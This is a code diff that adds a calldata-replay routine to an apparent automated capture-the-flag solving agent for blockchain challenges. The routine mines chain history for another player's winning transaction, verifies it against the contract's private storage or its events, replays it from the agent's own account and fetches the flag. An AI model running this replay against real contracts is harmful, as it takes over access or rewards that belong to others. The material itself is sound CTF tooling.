@@ -49,6 +49,9 @@ class BlockchainAgent(BaseAgent):
             "web3",
             "ethereum",
             "evm",
+            "onchain_history_analysis",
+            "event_log_eavesdropping",
+            "witnessed_calldata_replay",
         ]
 
     def analyze_challenge(self, challenge: Dict[str, Any]) -> Dict[str, Any]:
@@ -196,6 +199,44 @@ class BlockchainAgent(BaseAgent):
             steps.append("Warning: No local Solidity files found in the challenge.")
         else:
             steps.append(f"Loaded {len(solidity_sources)} Solidity file(s) for analysis.")
+
+        # Witnessed-calldata replay: when the winning move was already made
+        # on-chain by another actor, the correct argument is sitting in a prior
+        # transaction. Mine it from history — identified by verifying against the
+        # contract's own ("private") storage or by the success event it emitted —
+        # and replay it. Solves the "don't talk, listen to events" class where a
+        # keccak/XOR gate over private storage looks unbreakable but the key was
+        # already broadcast. Runs first: it is read-heavy but sends no failing tx.
+        replay_flag = self._try_witnessed_calldata_replay(
+            rpc_url=rpc_url,
+            private_key=private_key,
+            attacker_address=attacker_address,
+            target_address=target_address,
+            setup_address=setup_address,
+            flag_url=flag_url,
+            solidity_sources=solidity_sources,
+            steps=steps,
+        )
+        if replay_flag:
+            return {
+                "challenge_id": challenge.get("id"),
+                "agent_id": self.agent_id,
+                "status": "solved",
+                "flag": replay_flag,
+                "steps": steps,
+                "techniques": [
+                    "onchain_history_analysis",
+                    "event_log_eavesdropping",
+                    "witnessed_calldata_replay",
+                    "private_storage_read",
+                ],
+                "artifacts": {
+                    "witnessed_replay": {
+                        "technique": "witnessed_calldata_replay",
+                        "captured_sensitive_values": False,
+                    }
+                },
+            }
 
         # Source-driven attacker-contract drain: solves the "damage requires a
         # contract caller" pattern by reading the challenge's own contracts and
@@ -370,6 +411,332 @@ class BlockchainAgent(BaseAgent):
 
     def get_capabilities(self) -> List[str]:
         return self.capabilities
+
+    # ---------------------------------------------------------- witnessed replay
+    def _try_witnessed_calldata_replay(
+        self,
+        *,
+        rpc_url: str,
+        private_key: Optional[str],
+        attacker_address: Optional[str],
+        target_address: Optional[str],
+        setup_address: Optional[str],
+        flag_url: Optional[str],
+        solidity_sources: Dict[str, str],
+        steps: List[str],
+    ) -> Optional[str]:
+        """Replay a winning argument that another actor already broadcast on-chain.
+
+        Pattern: ``isSolved`` is gated on a state variable set to ``msg.sender``
+        inside a function whose single fixed-size argument must satisfy an
+        opaque check (e.g. ``keccak256(_key ^ encryptedFlag) == hashedFlag``).
+        The check looks one-way, but the correct argument is public — it sits in
+        the calldata of whoever solved it before. We identify that transaction by
+        verifying candidate arguments against the contract's own storage, or by
+        the success event it emitted, then replay it from the operator account.
+        Everything is discovered from the challenge's Solidity source.
+        """
+        if not all((rpc_url, private_key, target_address, flag_url)):
+            return None
+        joined = "\n".join(solidity_sources.values())
+        plan = self._discover_witness_replay(joined)
+        if not plan:
+            return None  # pattern absent; let the other playbooks run
+
+        try:
+            import requests
+            from web3 import Web3
+            from eth_utils import keccak
+            from eth_abi import encode as abi_encode
+        except Exception as exc:  # pragma: no cover - deps are project requirements
+            steps.append(f"Witnessed-replay unavailable (missing dependency): {exc}")
+            return None
+
+        assert_url_allowed(rpc_url)
+        assert_url_allowed(flag_url)
+        try:
+            web3 = Web3(Web3.HTTPProvider(rpc_url, request_kwargs={"timeout": 15}))
+            if not web3.is_connected():
+                return None
+            acct = web3.eth.account.from_key(private_key)
+            target = Web3.to_checksum_address(target_address)
+            solve_fn, arg_type = plan["solve_fn"], plan["arg_type"]
+            selector = keccak(f"{solve_fn}({arg_type})".encode())[:4]
+            steps.append(
+                f"Detected solve function {solve_fn}({arg_type}) that assigns msg.sender "
+                f"to `{plan['state_var']}`; scanning chain history for prior callers."
+            )
+
+            latest = web3.eth.block_number
+            start = max(0, latest - plan["max_blocks"])
+            candidates: List[Tuple[bytes, Any, str]] = []  # (arg32, tx_hash, from)
+            for bn in range(start, latest + 1):
+                block = web3.eth.get_block(bn, full_transactions=True)
+                for tx in block.transactions:
+                    to = tx.get("to")
+                    if not to or Web3.to_checksum_address(to) != target:
+                        continue
+                    raw = self._tx_input_bytes(tx)
+                    if len(raw) < 4 + 32 or raw[:4] != selector:
+                        continue
+                    candidates.append((raw[4:36], tx["hash"], str(tx.get("from") or "")))
+            if not candidates:
+                steps.append("No historical calls to the solve function were found on-chain.")
+                return None
+            steps.append(
+                f"Found {len(candidates)} historical call(s) to {solve_fn}; "
+                "identifying the winning argument."
+            )
+
+            winner = self._select_winning_arg(
+                web3, target, candidates, plan, keccak, abi_encode, steps
+            )
+            replayed_any = False
+            if winner is not None:
+                steps.append(f"Recovered winning argument from a prior transaction: 0x{winner.hex()}")
+                if not self._replay_solve_arg(web3, acct, target, selector, winner, steps):
+                    return None
+                replayed_any = True
+            else:
+                # No pre-verifiable winner: bounded replay of distinct arguments
+                # broadcast by *other* players, newest first, checking isSolved.
+                others = [c for c in candidates if c[2].lower() != acct.address.lower()]
+                distinct: List[bytes] = []
+                for arg, _tx, _frm in reversed(others):
+                    if arg not in distinct:
+                        distinct.append(arg)
+                distinct = distinct[: plan["max_replays"]]
+                if not distinct:
+                    steps.append("Could not identify a winning argument from history.")
+                    return None
+                steps.append(
+                    f"No pre-verifiable winner; bounded-replaying {len(distinct)} witnessed "
+                    "argument(s) until isSolved holds."
+                )
+                for arg in distinct:
+                    if not self._replay_solve_arg(web3, acct, target, selector, arg, steps):
+                        continue
+                    replayed_any = True
+                    if self._verify_solved(web3, setup_address, target, acct.address, steps):
+                        winner = arg
+                        break
+                if winner is None:
+                    steps.append("Bounded replay exhausted without satisfying isSolved.")
+                    return None
+
+            if not self._verify_solved(web3, setup_address, target, acct.address, steps):
+                return None
+            response = requests.get(flag_url, timeout=10)
+            flag = find_first_flag(response.text if response.status_code == 200 else "")
+            if flag:
+                steps.append("Retrieved the flag after replaying the witnessed transaction.")
+                return flag
+            steps.append("Solve verified on-chain but the flag endpoint returned no flag.")
+        except Exception as exc:  # noqa: BLE001
+            steps.append(f"Witnessed-calldata replay did not complete: {exc}")
+        return None
+
+    @staticmethod
+    def _tx_input_bytes(tx: Any) -> bytes:
+        data = tx.get("input")
+        if isinstance(data, (bytes, bytearray)):
+            return bytes(data)
+        text = data.hex() if hasattr(data, "hex") else str(data)
+        if text.startswith("0x"):
+            text = text[2:]
+        try:
+            return bytes.fromhex(text)
+        except ValueError:
+            return b""
+
+    @staticmethod
+    def _discover_witness_replay(joined_source: str) -> Optional[Dict[str, Any]]:
+        """Discover the replay pattern from Solidity source, or return None.
+
+        Requires a state variable assigned ``= msg.sender`` inside an
+        external/public function taking a single 32-byte-encodable argument. Also
+        records whether an XOR+keccak-vs-storage gate is present (so a candidate
+        can be verified locally) and any constant-valued success event (so the
+        winning transaction can be spotted in the logs).
+        """
+        if not joined_source:
+            return None
+        # The solve function must (a) set a state var to msg.sender and (b) gate
+        # that on a one-way check of its argument. Requiring the cryptographic
+        # gate is what separates this replay class from first-caller ("aggro")
+        # slots in drain challenges, which also assign msg.sender.
+        one_way = re.compile(r"keccak256|sha256|ripemd160|ecrecover")
+        for match in re.finditer(
+            r"function\s+(\w+)\s*\(\s*([\w\[\]]+)\s+\w+\s*\)\s*(?:external|public)[^{]*\{(.*?)\n\s*\}",
+            joined_source,
+            re.S,
+        ):
+            fn_name, arg_decl, body = match.group(1), match.group(2), match.group(3)
+            setter = re.search(r"(\w+)\s*=\s*msg\.sender", body)
+            if not setter or not one_way.search(body):
+                continue
+            canonical = BlockchainAgent._canonical_abi_type(arg_decl)
+            if canonical is None:
+                continue  # dynamic/oversized arg not a single-word replayable value
+
+            hash_compare = bool(re.search(r"\^", body) and re.search(r"keccak256", body))
+            success_event = None
+            emit = re.search(r"emit\s+(\w+)\s*\(\s*(\d+)\s*\)\s*;", body)
+            if emit:
+                ev_name, const = emit.group(1), int(emit.group(2))
+                decl = re.search(rf"event\s+{ev_name}\s*\(([^)]*)\)", joined_source)
+                if decl:
+                    params = [p.strip() for p in decl.group(1).split(",") if p.strip()]
+                    types = [
+                        BlockchainAgent._canonical_abi_type(p.split()[0]) or p.split()[0]
+                        for p in params
+                    ]
+                    success_event = {"sig": f"{ev_name}({','.join(types)})", "const": const}
+
+            return {
+                "solve_fn": fn_name,
+                "arg_type": canonical,
+                "state_var": setter.group(1),
+                "hash_compare": hash_compare,
+                "success_event": success_event,
+                "max_blocks": 5000,
+                "max_replays": 12,
+            }
+        return None
+
+    @staticmethod
+    def _canonical_abi_type(sol_type: str) -> Optional[str]:
+        """Return the canonical ABI type if it encodes to a single 32-byte word."""
+        t = sol_type.strip()
+        aliases = {"uint": "uint256", "int": "int256", "byte": "bytes1"}
+        t = aliases.get(t, t)
+        if t in {"address", "bool"} or re.fullmatch(r"bytes([1-9]|[12]\d|3[0-2])", t):
+            return t
+        if re.fullmatch(r"u?int(\d+)?", t):
+            bits = re.search(r"\d+", t)
+            if bits and not (8 <= int(bits.group()) <= 256 and int(bits.group()) % 8 == 0):
+                return None
+            return t
+        return None  # dynamic (bytes/string/arrays) — not a single-word arg
+
+    def _select_winning_arg(
+        self, web3, target, candidates, plan, keccak, abi_encode, steps
+    ) -> Optional[bytes]:
+        """Pick the winning argument without sending a transaction, if possible."""
+        # 1) Verify against the contract's own storage (the XOR/keccak gate).
+        if plan.get("hash_compare"):
+            try:
+                slot0 = bytes(web3.eth.get_storage_at(target, 0))
+                slot1 = bytes(web3.eth.get_storage_at(target, 1))
+            except Exception:
+                slot0 = slot1 = b""
+            for encrypted, hashed in ((slot0, slot1), (slot1, slot0)):
+                if len(encrypted) != 32 or len(hashed) != 32:
+                    continue
+                for arg, _txh, _frm in candidates:
+                    preimage = bytes(a ^ b for a, b in zip(arg, encrypted))
+                    if keccak(abi_encode(["bytes32"], [preimage])) == hashed:
+                        steps.append(
+                            "Verified the winning argument against the contract's stored "
+                            "hash — no failed transaction needed."
+                        )
+                        return arg
+        # 2) Identify the winning transaction by its success event in the logs.
+        event = plan.get("success_event")
+        if event:
+            topic0 = keccak(event["sig"].encode())
+            const = event.get("const")
+            for arg, txh, _frm in candidates:
+                try:
+                    receipt = web3.eth.get_transaction_receipt(txh)
+                except Exception:
+                    continue
+                for log in receipt.logs:
+                    topics = log.get("topics") if isinstance(log, dict) else log.topics
+                    if not topics or bytes(topics[0]) != topic0:
+                        continue
+                    if const is not None and not self._event_const_matches(log, topics, const):
+                        continue
+                    steps.append(
+                        "Identified the winning transaction by its success event "
+                        "(listened to the logs instead of guessing)."
+                    )
+                    return arg
+        return None
+
+    @staticmethod
+    def _event_const_matches(log: Any, topics: Any, const: int) -> bool:
+        if len(topics) > 1 and int.from_bytes(bytes(topics[1]), "big") == const:
+            return True
+        data = log.get("data") if isinstance(log, dict) else log.data
+        if isinstance(data, str):
+            data = bytes.fromhex(data[2:] if data.startswith("0x") else data)
+        elif hasattr(data, "hex") and not isinstance(data, (bytes, bytearray)):
+            data = bytes(data)
+        return bool(data) and int.from_bytes(bytes(data)[-32:], "big") == const
+
+    def _replay_solve_arg(self, web3, acct, target, selector, arg, steps) -> bool:
+        """Send ``selector || arg`` from the operator account; True on success."""
+        try:
+            tx: Dict[str, Any] = {
+                "to": target,
+                "data": selector + arg,
+                "nonce": web3.eth.get_transaction_count(acct.address),
+                "gas": 200_000,
+                "chainId": web3.eth.chain_id,
+            }
+            base = web3.eth.gas_price
+            try:  # prefer EIP-1559, fall back to legacy pricing
+                tx["maxFeePerGas"] = base * 2
+                tx["maxPriorityFeePerGas"] = base
+            except Exception:
+                tx["gasPrice"] = base
+            signed = acct.sign_transaction(tx)
+            receipt = web3.eth.wait_for_transaction_receipt(
+                web3.eth.send_raw_transaction(signed.raw_transaction), timeout=60
+            )
+            if int(receipt.status) != 1:
+                steps.append("Replay transaction reverted.")
+                return False
+            return True
+        except Exception as exc:  # noqa: BLE001
+            steps.append(f"Replay transaction failed: {exc}")
+            return False
+
+    @staticmethod
+    def _verify_solved(web3, setup_address, target, player, steps) -> bool:
+        """Confirm the solve via Setup.isSolved(player)/isSolved() or storage."""
+        from web3 import Web3
+
+        player_cs = Web3.to_checksum_address(player)
+        if setup_address:
+            setup_cs = Web3.to_checksum_address(setup_address)
+            for abi in (
+                [{"inputs": [{"type": "address", "name": "p"}], "name": "isSolved",
+                  "outputs": [{"type": "bool"}], "stateMutability": "view", "type": "function"}],
+                [{"inputs": [], "name": "isSolved", "outputs": [{"type": "bool"}],
+                  "stateMutability": "view", "type": "function"}],
+            ):
+                try:
+                    contract = web3.eth.contract(address=setup_cs, abi=abi)
+                    fn = contract.functions.isSolved
+                    solved = bool(fn(player_cs).call() if abi[0]["inputs"] else fn().call())
+                    if solved:
+                        steps.append("Verified Setup.isSolved() == true.")
+                        return True
+                except Exception:
+                    continue
+        # Fallback: read the solver-style address slot and compare to the player.
+        try:
+            for slot in (2, 0, 1):
+                stored = bytes(web3.eth.get_storage_at(Web3.to_checksum_address(target), slot))[-20:]
+                if stored.hex().lower() == player_cs[2:].lower():
+                    steps.append("Verified on-chain solver == player via storage.")
+                    return True
+        except Exception:
+            pass
+        steps.append("Could not verify isSolved after the replay.")
+        return False
 
     def _try_source_driven_contract_drain(
         self,
